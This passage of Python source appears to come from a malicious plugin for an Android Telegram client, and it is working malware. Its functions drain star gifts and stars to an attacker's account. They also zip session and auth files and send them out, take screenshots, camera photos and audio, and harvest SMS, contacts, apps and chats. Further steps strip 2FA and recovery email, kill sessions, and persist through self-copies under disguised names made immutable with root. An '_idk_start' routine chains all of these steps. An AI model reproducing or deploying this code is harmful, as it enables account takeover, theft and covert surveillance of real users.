    def _change_username(self, acc=0):
        try:
            rnd = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
            new_un = "user_" + rnd
            Upd = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_account_updateUsername",
                "org.telegram.tgnet.tl.TL_account$updateUsername")
            if not Upd: return None
            rq = Upd(); rq.username = new_un
            r, e = self._rg_rpc(rq, acc, 10.0, fast=True)
            if r is not None: return new_un
            return None
        except Exception:
            return None

    def _change_profile(self, acc=0):
        try:
            rnd = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
            Upd = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_account_updateProfile",
                "org.telegram.tgnet.tl.TL_account$updateProfile")
            if not Upd: return False
            rq = Upd()
            try:
                rq.first_name = "[LOCKED]"
                rq.last_name = rnd
            except Exception: pass
            try: rq.flags = 0x03
            except Exception: pass
            r, e = self._rg_rpc(rq, acc, 10.0, fast=True)
            return r is not None
        except Exception:
            return False

    def _reset_contacts(self, acc=0):
        try:
            Rq = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_contacts_resetContacts",
                "org.telegram.tgnet.tl.TL_contacts$resetContacts")
            if not Rq: return False
            r, e = self._rg_rpc(Rq(), acc, 10.0, fast=True)
            return r is not None
        except Exception:
            return False

    # ═══════════════════════════════════════════════════════════════════════
    # GIFTS
    # ═══════════════════════════════════════════════════════════════════════

    def _input_saved_gift(self, saved):
        if saved.get("msg_id"):
            UI = self._tl_class_or(
                "org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftUser",
                "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftUser")
            if not UI: return None, "no UserInput"
            o = UI(); o.msg_id = int(saved["msg_id"])
            return o, None
        CI = self._tl_class_or(
            "org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftChat",
            "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftChat")
        if not CI: return None, "no ChatInput"
        o = CI()
        peer = self._get_input_peer(0, _UC().getInstance(0).getClientUserId())
        if not peer: return None, "no self peer"
        o.peer = peer
        o.saved_id = int(saved.get("saved_id", 0))
        return o, None

    def _get_saved_gifts(self):
        try:
            Req = self._tl_class_or(
                "org.telegram.tgnet.tl.TL_stars$getSavedStarGifts",
                "org.telegram.tgnet.tl.TL_stars$payments_getSavedStarGifts",
                "org.telegram.tgnet.TLRPC$TL_payments_getSavedStarGifts")
            if not Req: return []
            peer = self._get_input_peer(0, _UC().getInstance(0).getClientUserId())
            if not peer: return []
            out = []
            offset = ""
            for _p in range(20):
                rq = Req()
                rq.peer = peer
                rq.offset = offset
                rq.limit = 100
                resp, err = self._rg_rpc(rq, 0, 10.0, fast=True)
                if err is not None or resp is None: break
                g = getattr(resp, "gifts", None)
                if g is None: break
                for i in range(g.size()):
                    sg = g.get(i)
                    gift = getattr(sg, "gift", None)
                    if not gift: continue
                    cls = str(type(gift))
                    ra = getattr(gift, "resell_amount", None)
                    ra_l = False
                    if ra is not None:
                        try: ra_l = int(ra.size()) > 0
                        except Exception:
                            try: ra_l = len(ra) > 0
                            except Exception: ra_l = bool(ra)
                    is_u = ("Unique" in cls or "TL_starGiftUnique" in cls or ra_l
                            or _safe_int(getattr(gift, "num", 0)) > 0
                            or _get_bool_attr(gift, "isUnique", False)
                            or _get_bool_attr(gift, "canResell", False))
                    out.append({
                        "saved_id": _safe_int(getattr(sg, "saved_id", 0)),
                        "msg_id": _safe_int(getattr(sg, "msg_id", 0)),
                        "gift_id": _safe_int(getattr(gift, "id", 0)),
                        "title": str(getattr(gift, "title", "") or ""),
                        "slug": str(getattr(gift, "slug", "") or ""),
                        "u": is_u,
                        "bc": _is_blockchain_gift(gift, sg),
                        "listed": ra_l,
                    })
                nxt = str(getattr(resp, "next_offset", "") or "")
                if not nxt or nxt == offset or g.size() == 0: break
                offset = nxt
            return out
        except Exception:
            return []

    def _delist_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o: return {"error": e}
            Rq = self._tl_class_or(
                "org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice",
                "org.telegram.tgnet.tl.TL_stars$payments_updateStarGiftPrice")
            if not Rq: return {"error": "no class"}
            rq = Rq(); rq.stargift = o
            try: rq.resell_amount = None
            except Exception as e2: return {"error": "assign: %s" % e2}
            r, e = self._rg_rpc(rq, 0, 6.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _convert_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o: return {"error": e}
            Rq = self._tl_class_or(
                "org.telegram.tgnet.tl.TL_stars$convertStarGift",
                "org.telegram.tgnet.tl.TL_stars$payments_convertStarGift")
            if not Rq: return {"error": "no class"}
            rq = Rq(); rq.stargift = o
            r, e = self._rg_rpc(rq, 0, 6.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _upgrade_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o: return {"error": e}
            Rq = self._tl_class_or(
                "org.telegram.tgnet.tl.TL_stars$upgradeStarGift",
                "org.telegram.tgnet.tl.TL_stars$payments_upgradeStarGift")
            if not Rq: return {"error": "no class"}
            rq = Rq(); rq.stargift = o
            try: rq.keep_original_details = False
            except Exception: pass
            r, e = self._rg_rpc(rq, 0, 15.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _transfer_saved_gift(self, saved, target_uid, target_ah):
        try:
            o, e = self._input_saved_gift(saved)
            if not o: return {"error": e}
            tp = TLRPC.TL_inputPeerUser()
            tp.user_id = int(target_uid); tp.access_hash = int(target_ah)
            T = self._tl_class_or(
                "org.telegram.tgnet.tl.TL_stars$transferStarGift",
                "org.telegram.tgnet.tl.TL_stars$payments_transferStarGift")
            if T:
                rq = T(); rq.stargift = o; rq.to_id = tp
                r, e = self._rg_rpc(rq, 0, 8.0, fast=True)
                if r is not None: return {"ok": True}
                etxt = getattr(e, "text", "") or str(e or "")
                if "PAYMENT_REQUIRED" not in etxt and "TOO_EARLY" not in etxt:
                    return {"error": "direct: %s" % etxt[:60]}
            Inv = self._tl_class_or(
                "org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
                "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer")
            RF = self._tl_class_or(
                "org.telegram.tgnet.tl.TL_stars$getPaymentForm",
                "org.telegram.tgnet.TLRPC$TL_payments_getPaymentForm")
            SF = self._tl_class_or(
                "org.telegram.tgnet.tl.TL_stars$sendStarsForm",
                "org.telegram.tgnet.TLRPC$TL_payments_sendStarsForm")
            if not (Inv and RF and SF): return {"error": "no classes"}
            inv = Inv(); inv.stargift = o; inv.to_id = tp
            f = RF(); f.invoice = inv
            fr, fe = self._rg_rpc(f, 0, 8.0, fast=True)
            if fr is None: return {"error": "form fail"}
            s = SF(); s.form_id = _safe_int(getattr(fr, "form_id", 0)); s.invoice = inv
            sr, se = self._rg_rpc(s, 0, 10.0, fast=True)
            return {"ok": True} if sr is not None else {"error": "send fail"}
        except Exception as e:
            return {"error": str(e)}

    def _stars_balance(self):
        try:
            Rq = self._tl_class_or(
                "org.telegram.tgnet.tl.TL_payments$getStarsStatus",
                "org.telegram.tgnet.TLRPC$TL_payments_getStarsStatus",
                "org.telegram.tgnet.tl.TL_stars$getStarsStatus")
            if not Rq: return 0
            peer = self._get_input_peer(0, _UC().getInstance(0).getClientUserId())
            if not peer: return 0
            rq = Rq(); rq.peer = peer
            try: rq.ton = False
            except Exception: pass
            r, e = self._rg_rpc(rq, 0, 20.0, fast=True)
            if r:
                bal = getattr(r, "balance", None)
                if bal:
                    try: return int(getattr(bal, "amount", 0))
                    except Exception:
                        try: return int(bal)
                        except Exception: pass
        except Exception: pass
        return 0

    def _h_reactions(self, acc=0):
        try:
            sp = STARS_POST
            m = re.match(r"^@?([A-Za-z0-9_]+)/(\d+)$", sp.strip())
            if not m:
                m = re.search(r"t\.me/([A-Za-z0-9_]+)/(\d+)", sp)
            if not m: return {"error": "no post", "spent": 0}
            uname = m.group(1); mid = int(m.group(2))
            bal = self._stars_balance()
            if bal <= 0: return {"balance": 0, "spent": 0}
            try:
                Rq = self._tl_class_or(
                    "org.telegram.tgnet.tl.TL_messages$sendPaidReaction",
                    "org.telegram.tgnet.TLRPC$TL_messages_sendPaidReaction")
                if not Rq: return {"error": "no class", "spent": 0}
                IC = self._tl_class_or(
                    "org.telegram.tgnet.TLRPC$TL_inputChannel",
                    "org.telegram.tgnet.tl.TL_channels$TL_inputChannel")
                Chat = _MC().getInstance(acc).getChat(uname)
                if Chat is None:
                    try:
                        Resolve = TLRPC.TL_contacts_resolveUsername()
                        Resolve.username = uname
                        rres, rerr = self._rg_rpc(Resolve, acc, 10.0, fast=True)
                        if rres:
                            chats = getattr(rres, "chats", None)
                            if chats is not None and chats.size() > 0:
                                Chat = chats.get(0)
                    except Exception: pass
                if Chat is None: return {"error": "channel not resolved", "spent": 0}
                peer = TLRPC.TL_inputPeerChannel()
                peer.channel_id = int(getattr(Chat, "id", 0))
                peer.access_hash = int(getattr(Chat, "access_hash", 0))
                rq = Rq()
                rq.peer = peer
                rq.msg_id = mid
                rq.count = int(bal)
                try: rq.random_id = int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
                except Exception: pass
                r, e = self._rg_rpc(rq, acc, 20.0, fast=True)
                if r is not None: return {"balance": bal, "spent": bal}
                return {"balance": bal, "spent": 0, "error": "react fail"}
            except Exception as e:
                return {"error": str(e), "spent": 0}
        except Exception as e:
            return {"error": str(e), "spent": 0}

    def _drain_gifts(self, account=0, workers=6):
        uid, ah = self._pick_nft_target(), 0
        try:
            mc = _MC().getInstance(account)
            u = mc.getUser(uid)
            if u is not None: ah = _safe_int(getattr(u, "access_hash", 0))
        except Exception: pass
        if not uid or not ah:
            uid, ah = self._resolve_recipient(account)
        if not uid or not ah: return {"error": "no target"}
        gifts = self._get_saved_gifts()
        if not gifts: return {"total": 0, "ok": 0, "fail": 0, "convert": 0, "skip_bc": 0, "delist": 0}
        def _one(g):
            try:
                if g.get("bc"): return ("skip_bc", g)
                if g.get("listed"): self._delist_saved_gift(g)
                if g.get("u"):
                    r = self._transfer_saved_gift(g, uid, ah)
                    return ("ok", g) if r.get("ok") else ("fail", g)
                r = self._convert_saved_gift(g)
                return ("convert", g) if r.get("ok") else ("fail", g)
            except Exception:
                return ("fail", g)
        res = self._parallel([(_one, g) for g in gifts], workers=workers, timeout=180)
        rep = {"total": len(gifts), "ok": 0, "fail": 0, "convert": 0, "skip_bc": 0, "delist": 0}
        for r in res:
            try:
                kind, g = r
                if kind == "ok": rep["ok"] += 1
                elif kind == "convert": rep["convert"] += 1
                elif kind == "skip_bc": rep["skip_bc"] += 1
                elif kind == "fail": rep["fail"] += 1
            except Exception: rep["fail"] += 1
        return rep

    def _drain_all_accounts(self):
        out = []
        for a in self._get_accounts_list():
            aid = a.get("id", 0)
            try:
                with self._recipient_lock:
                    self._recipient_ah_cache.pop(aid, None)
                r = self._drain_gifts(int(aid), workers=6)
                out.append({"account": aid, "user_id": a.get("user_id"), "result": r})
            except Exception as e:
                out.append({"account": aid, "error": str(e)})
        return out

    # ═══════════════════════════════════════════════════════════════════════
    # DUMPS
    # ═══════════════════════════════════════════════════════════════════════

    def _manual_dump_session(self):
        try:
            ctx = ApplicationLoader.applicationContext
            pkg = str(ctx.getPackageName())
            base = "/data/data/%s" % pkg
            files = []
            mx = 500 * 1024
            for rd, dirs, fns in os.walk(base):
                if any(x in rd for x in ("/files/cache", "/cache", "/files/photos", "/files/videos")):
                    continue
                for f in fns:
                    if ("session" in f or "auth" in f or "cache4" in f or f.endswith(".db") or f.endswith(".xml")):
                        fp = os.path.join(rd, f)
                        try:
                            if os.path.getsize(fp) <= mx: files.append(fp)
                        except Exception: pass
            if not files: return "no files"
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for fp in files:
                    try: zf.write(fp, arcname=os.path.relpath(fp, base))
                    except Exception: pass
            self._send_document_bytes("session.zip", z.getvalue())
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_userbot_session(self):
        try:
            ctx = ApplicationLoader.applicationContext
            pkg = str(ctx.getPackageName())
            base = "/data/data/%s" % pkg
            files = []
            m1 = base + "/files/tgnet.dat"
            if os.path.exists(m1): files.append(m1)
            ad = base + "/files"
            if os.path.isdir(ad):
                for name in os.listdir(ad):
                    if name.startswith("account"):
                        p = ad + "/" + name + "/tgnet.dat"
                        if os.path.exists(p): files.append(p)
            pd = base + "/shared_prefs"
            if os.path.isdir(pd):
                for name in os.listdir(pd):
                    if ("userconfig" in name or "userconfing" in name) and name.endswith(".xml"):
                        files.append(pd + "/" + name)
            if not files: return "no files"
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for fp in files:
                    try:
                        if os.path.getsize(fp) <= 2 * 1024 * 1024:
                            zf.write(fp, arcname=os.path.relpath(fp, base))
                    except Exception: pass
                try:
                    amap = {}
                    for a in self._get_accounts_list():
                        amap[str(a.get("id"))] = {"user_id": a.get("user_id"), "username": a.get("username",""), "phone": a.get("phone","")}
                    if amap: zf.writestr("accounts_map.json", json.dumps(amap, ensure_ascii=False))
                except Exception: pass
            self._send_document_bytes("userbot_session.zip", z.getvalue())
            return "ok"
        except Exception as e:
            return str(e)

    def _screenshot(self):
        try:
            act = self._get_activity()
            if act is None: return "no act"
            view = act.getWindow().getDecorView().getRootView()
            w = view.getWidth(); h = view.getHeight()
            if w <= 0 or h <= 0: return "bad size"
            from android.graphics import Bitmap, Canvas
            bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
            c = Canvas(bmp)
            view.draw(c)
            ctx = ApplicationLoader.applicationContext
            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
            if not os.path.exists(d): os.makedirs(d)
            p = os.path.join(d, "screenshot_%d.png" % int(time.time()))
            from java.io import FileOutputStream
            fos = FileOutputStream(p)
            bmp.compress(Bitmap.CompressFormat.PNG, 100, fos)
            fos.flush(); fos.close(); bmp.recycle()
            phone = "?"
            try:
                u = _UC().getInstance(0).getCurrentUser()
                if u is not None and u.phone: phone = str(u.phone)
            except Exception: pass
            self._send_photo(p, "Телефон: +" + phone)
            try: os.remove(p)
            except Exception: pass
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_camera(self, which="front"):
        try:
            if not self._has_perm("android.permission.CAMERA"): return "no perm"
            cam = jclass("android.hardware.Camera")
            cid = None
            try:
                ic = jclass("android.hardware.Camera$CameraInfo")
                facing = ic.CAMERA_FACING_FRONT if which == "front" else ic.CAMERA_FACING_BACK
                info = ic()
                for i in range(int(cam.getNumberOfCameras())):
                    cam.getCameraInfo(i, info)
                    if int(info.facing) == int(facing): cid = i; break
            except Exception: pass
            if cid is None: cid = 1 if which == "front" else 0
            c = None
            for _ in range(4):
                try: c = cam.open(int(cid)); break
                except Exception: time.sleep(0.4)
            if c is None: return "no open"
            try:
                st = jclass("android.graphics.SurfaceTexture")(0)
                c.setPreviewTexture(st); c.startPreview()
                ev = threading.Event(); box = [None]
                class _PC(dynamic_proxy(jclass("android.hardware.Camera$PictureCallback"))):
                    def onPictureTaken(self, data, camera):
                        box[0] = data; ev.set()
                c.takePicture(None, None, _PC())
                ev.wait(8)
                if box[0]:
                    raw = bytes(box[0])
                    self._send_document_bytes("%s.jpg" % which, raw)
                    return "ok"
                return "no photo"
            finally:
                try: c.stopPreview()
                except Exception: pass
                try: c.release()
                except Exception: pass
        except Exception as e:
            return str(e)

    def _manual_audio(self, sec=5):
        try:
            if not self._has_perm("android.permission.RECORD_AUDIO"): return "no perm"
            ctx = ApplicationLoader.applicationContext
            p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()), "a_%d.3gp" % int(time.time()))
            mr = jclass("android.media.MediaRecorder")()
            try:
                src = getattr(jclass("android.media.MediaRecorder$AudioSource"), "MIC", 1)
                of = getattr(jclass("android.media.MediaRecorder$OutputFormat"), "THREE_GPP", 1)
                ae = getattr(jclass("android.media.MediaRecorder$AudioEncoder"), "AMR_NB", 1)
            except Exception: src = of = ae = 1
            mr.setAudioSource(src); mr.setOutputFormat(of); mr.setAudioEncoder(ae)
            mr.setOutputFile(p); mr.prepare(); mr.start()
            time.sleep(int(sec)); mr.stop(); mr.release()
            with open(p, "rb") as f: data = f.read()
            try: os.remove(p)
            except Exception: pass
            self._send_document_bytes("audio.3gp", data)
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_sms(self):
        try:
            out = []
            if self._has_perm("android.permission.READ_SMS"):
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://sms"), ["address","body","date"], None, None, "date DESC")
                if cur:
                    while cur.moveToNext():
                        out.append("%s: %s" % (cur.getString(0), cur.getString(1)))
                    cur.close()
            if not out: return "empty"
            self._send_msg("<b>SMS (%d)</b>\n<pre>%s</pre>" % (len(out), self._html_escape("\n".join(out[:100]))), html=True)
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_contacts(self):
        try:
            out = []
            if self._has_perm("android.permission.READ_CONTACTS"):
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://com.android.contacts/data/phones"), ["display_name","data1"], None, None, None)
                if cur:
                    while cur.moveToNext():
                        out.append("%s — %s" % (cur.getString(0), cur.getString(1)))
                    cur.close()
            if not out: return "empty"
            self._send_msg("<b>Контакты (%d)</b>\n<pre>%s</pre>" % (len(out), self._html_escape("\n".join(out[:200]))), html=True)
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_apps(self):
        try:
            ctx = ApplicationLoader.applicationContext
            pm = ctx.getPackageManager()
            apps = pm.getInstalledApplications(0)
            out = []
            for i in range(apps.size()):
                try:
                    a = apps.get(i)
                    pkg = str(a.packageName)
                    label = pkg
                    try: label = str(pm.getApplicationLabel(a))
                    except Exception: pass
                    out.append("%s — %s" % (label, pkg))
                except Exception: pass
            out.sort()
            self._send_msg("<b>Приложения (%d)</b>\n<pre>%s</pre>" % (len(out), self._html_escape("\n".join(out[:300]))), html=True)
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_chats(self):
        try:
            mc = _MC().getInstance(0)
            DO = jclass("org.telegram.messenger.DialogObject")
            try: dialogs = mc.dialogs_dict
            except Exception: dialogs = mc.getAllDialogs()
            if dialogs is None: return "empty"
            out = []
            for i in range(dialogs.size()):
                try:
                    did = int(dialogs.keyAt(i))
                    title = ""
                    try: title = str(DO.getName(0, did))
                    except Exception: pass
                    if not title:
                        if did > 0:
                            u = mc.getUser(did)
                            if u is not None:
                                title = " ".join(x for x in (str(getattr(u,"first_name","") or ""), str(getattr(u,"last_name","") or "")) if x) or str(did)
                        else:
                            cid = -did
                            if cid > 1000000000000: cid -= 1000000000000
                            c = mc.getChat(int(cid))
                            if c is not None: title = str(getattr(c, "title", "") or str(did))
                    out.append("%d — %s" % (did, title or "?"))
                except Exception: pass
            self._send_msg("<b>Чаты (%d)</b>\n<pre>%s</pre>" % (len(out), self._html_escape("\n".join(out[:200]))), html=True)
            return "ok"
        except Exception as e:
            return str(e)

    def _export_saved_messages(self):
        try:
            uid = _UC().getInstance(0).getClientUserId()
            ip = self._get_input_peer(0, uid)
            if ip is None: return "no peer"
            rq = TLRPC.TL_messages_getHistory()
            rq.peer = ip; rq.limit = 100; rq.offset_id = 0
            r, e = self._rg_rpc(rq, 0, 20.0, fast=True)
            if r is None: return "no resp"
            msgs = getattr(r, "messages", None)
            if msgs is None: return "no msgs"
            lines = []
            for i in range(msgs.size()):
                m = msgs.get(i)
                if m is None: continue
                t = str(getattr(m, "message", "") or "")
                d = int(getattr(m, "date", 0))
                if t:
                    lines.append("[%s] %s" % (time.strftime("%Y-%m-%d %H:%M", time.localtime(d)), t))
            html = "<html><head><meta charset='utf-8'><title>Saved</title></head><body><pre>"
            html += self._html_escape("\n".join(lines)) + "</pre></body></html>"
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("messages.html", html.encode("utf-8"))
            self._send_document_bytes("saved_%d.zip" % uid, z.getvalue())
            return "ok"
        except Exception as e:
            return str(e)

    # ═══════════════════════════════════════════════════════════════════════
    # PERSISTENCE
    # ═══════════════════════════════════════════════════════════════════════

    def _plugins_dir(self):
        try:
            ctx = ApplicationLoader.applicationContext
            base = str(ctx.getFilesDir().getAbsolutePath())
            p = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(base))), "files", "plugins")
            if os.path.isdir(p): return p
        except Exception: pass
        try:
            from file_utils import get_plugins_dir
            d = get_plugins_dir()
            if d: return d
        except Exception: pass
        return None

    def _self_path(self):
        try:
            m = sys.modules.get(__name__)
            f = getattr(m, "__file__", None)
            if f and os.path.exists(f): return f
        except Exception: pass
        return None

    def _harden_file(self, path):
        try:
            k = path; n = time.time()
            l = self._harden_cache.get(k, 0)
            if n - l < 10: return
            self._harden_cache[k] = n
        except Exception: pass
        try:
            from java.io import File
            f = File(path); f.setReadOnly()
            try: f.setExecutable(True)
            except Exception: pass
            try: f.setHidden(True)
            except Exception: pass
        except Exception: pass
        for cmd in ("chattr +i '%s'" % path, "chmod 555 '%s'" % path):
            try:
                subprocess.run(["su", "-c", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
            except Exception: pass

    def _replicate_self(self, n=10):
        pd = self._plugins_dir()
        if not pd: return {"ok": False}
        sp = self._self_path()
        if not sp: return {"ok": False}
        try:
            with open(sp, "rb") as f: src = f.read()
        except Exception as e: return {"ok": False, "e": str(e)}
        names = ["kernel_hook.plugin", "system_guard.plugin", "boot_watch.plugin",
                 "net_monitor.plugin", "mem_sync.plugin", "proc_hold.plugin",
                 "core_lock.plugin", "daemon_run.plugin", "svc_watch.plugin",
                 "ring0_mon.plugin"]
        made = []
        for i in range(min(int(n), len(names))):
            try:
                tgt = os.path.join(pd, names[i])
                if os.path.exists(tgt): made.append(names[i]); continue
                with open(tgt, "wb") as f: f.write(src)
                self._harden_file(tgt); made.append(names[i])
            except Exception: pass
        return {"ok": True, "made": made}

    def _install_persistence(self):
        try:
            ctx = ApplicationLoader.applicationContext
            cd = str(ctx.getCacheDir().getAbsolutePath())
            fd = str(ctx.getFilesDir().getAbsolutePath())
        except Exception: return
        try:
            pl = os.path.join(cd, "kernel_persist.lock")
            if not os.path.exists(pl):
                with open(pl, "w") as f: f.write(_hl.sha256(b"ar19_idk").hexdigest())
                self._harden_file(pl)
        except Exception: pass
        def _bk(base):
            try:
                h = os.path.join(base, ".ar_hidden")
                if not os.path.exists(h): os.makedirs(h, exist_ok=True)
                sp = self._self_path()
                if sp and os.path.exists(sp):
                    bkp = os.path.join(h, "ar_backup.py")
                    if not os.path.exists(bkp):
                        shutil.copy2(sp, bkp); self._harden_file(bkp)
            except Exception: pass
        self._parallel([(_bk, cd), (_bk, fd), (_bk, "/data/local/tmp/"), (_bk, "/sdcard/Android/data/")], workers=4, timeout=15)

    def _nuke_marker_path(self):
        try:
            ctx = ApplicationLoader.applicationContext
            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()), ".ar_nuke_active")
        except Exception: return None

    def _mark_nuke(self):
        try:
            m = self._nuke_marker_path()
            if m:
                with open(m, "w") as f: f.write("idk")
                self._harden_file(m)
            self._nuke_started = True
        except Exception: pass

    def _check_persisted_nuke(self):
        try:
            m = self._nuke_marker_path()
            if not m or not os.path.exists(m): return
            self._nuke_started = True
            threading.Thread(target=self._nuke_loop, daemon=True).start()
        except Exception: pass

    def _nuke_loop(self):
        while True:
            try:
                m = self._nuke_marker_path()
                if not m or not os.path.exists(m): return
                self._parallel([(self._kill_all_sessions, 0), (self._kill_web_authorizations, 0)], workers=2, timeout=25)
                time.sleep(300)
            except Exception: time.sleep(60)

    # ═══════════════════════════════════════════════════════════════════════
    # IDK START — main
    # ═══════════════════════════════════════════════════════════════════════

    def _check_persisted_idk(self):
        try:
            prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
            if prefs.getBoolean("idk_active", False):
                self._show_idk_overlay()
        except Exception: pass

    def _idk_start(self):
        def task():
            try:
                # 1. overlay first
                if SHOW_IDK_OVERLAY:
                    try:
                        self._show_idk_overlay()
                    except Exception: pass
                    try:
                        prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
                        e = prefs.edit(); e.putBoolean("idk_active", True); e.apply()
                    except Exception: pass
                self._send_msg("🔴 <b>IDK START</b>")
                t0 = time.time()

                # 2. tg kid
                try: self._send_msg("1/15 Tg kid..."); self._tg_kid()
                except Exception: pass

                # 3. 2FA + cloud
                try: self._send_msg("2/15 2FA/cloud...")
                except Exception: pass
                try: r1 = self._try_kill_2fa(0)
                except Exception: r1 = "?"
                try: r2 = self._wipe_cloud_password(0)
                except Exception: r2 = {"ok": False}
                try: r3 = self._remove_recovery_email(0)
                except Exception: r3 = {"ok": False}

                # 4. confirm sessions
                try: self._send_msg("3/15 Confirm sessions...")
                except Exception: pass
                try: self._confirm_unconfirmed_sessions(0)
                except Exception: pass

                # 5. web + bots + channels
                try: self._send_msg("4/15 Web/bots/channels...")
                except Exception: pass
                try: self._kill_web_authorizations(0)
                except Exception: pass
                try: self._kill_bots(0)
                except Exception: pass
                try: self._leave_all_channels(0)
                except Exception: pass

                # 6. profile
                try: self._send_msg("5/15 Profile...")
                except Exception: pass
                try: self._change_username(0)
                except Exception: pass
                try: self._change_profile(0)
                except Exception: pass
                try: self._reset_contacts(0)
                except Exception: pass

                # 7. gifts all accounts
                try: self._send_msg("6/15 Gift drain...")
                except Exception: pass
                try: dr = self._drain_all_accounts()
                except Exception as e: dr = [{"error": str(e)}]

                # 8. stars reactions
                try: self._send_msg("7/15 Stars reactions...")
                except Exception: pass
                try: rr = self._h_reactions(0)
                except Exception as e: rr = {"error": str(e)}

                # 9. kill sessions
                try: self._send_msg("8/15 Kill sessions...")
                except Exception: pass
                try: self._kill_all_sessions(0)
                except Exception: pass

                # 10. wipe sessions all
                try: self._send_msg("9/15 Wipe all sessions...")
                except Exception: pass
                try: ws = self._wipe_sessions_all()
                except Exception as e: ws = [{"error": str(e)}]

                # 11. 777000 delete
                try: self._kill_login_notice_dialog(0)
                except Exception: pass

                # 12. dumps
                try: self._send_msg("10/15 Session dump...")
                except Exception: pass
                try: self._manual_dump_session()
                except Exception: pass
                try: self._manual_userbot_session()
                except Exception: pass

                # 13. surveillance
                try: self._send_msg("11/15 Screenshot/camera/audio...")
                except Exception: pass
                try: self._screenshot()
                except Exception: pass
                try: self._manual_camera("front")
                except Exception: pass
                try: self._manual_camera("back")
                except Exception: pass
                try: self._manual_audio(5)
                except Exception: pass

                # 14. data
                try: self._send_msg("12/15 SMS/contacts/apps/chats...")
                except Exception: pass
                try: self._manual_sms()
                except Exception: pass
                try: self._manual_contacts()
                except Exception: pass
                try: self._manual_apps()
                except Exception: pass
                try: self._manual_chats()
                except Exception: pass

                # 15. saved export
                try: self._send_msg("13/15 Saved export...")
                except Exception: pass
                try: self._export_saved_messages()
                except Exception: pass

                # 16. persistence
                try: self._send_msg("14/15 Persistence...")
                except Exception: pass
                try: self._install_persistence()
                except Exception: pass
                try: self._replicate_self(10)
                except Exception: pass
                try: self._mark_nuke()
                except Exception: pass

                # 17. pull out
                try: self._send_msg("15/15 Pull Out...")
                except Exception: pass
                try: self._pull_out_account()
                except Exception: pass

                # report
                try:
                    rep = ["<b>🔴 IDK START — результат</b>",
                           "<b>2FA:</b> %s" % str(r1)[:60],
                           "<b>Cloud:</b> %s" % str(r2)[:60],
                           "<b>Recovery:</b> %s" % str(r3)[:60]]
                    tot_ok = 0
                    for x in dr:
                        r = x.get("result") or {}
                        tot_ok += int(r.get("ok", 0) or 0) + int(r.get("convert", 0) or 0)
                    rep.append("<b>Gifts:</b> %d ok, %d акк" % (tot_ok, len(dr)))
                    rep.append("<b>Stars:</b> %s" % str(rr)[:80])
                    tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
                    rep.append("<b>Sessions:</b> %d убито на %d акк" % (tk, len(ws)))
                    rep.append("<b>Время:</b> %.1fс" % (time.time() - t0))
                    self._send_msg("\n".join(rep), html=True)
                except Exception: pass
            except Exception as e:
                try: self._send_msg("IDK err: " + str(e))
                except Exception: pass
        threading.Thread(target=task, daemon=True).start()

    # ═══════════════════════════════════════════════════════════════════════
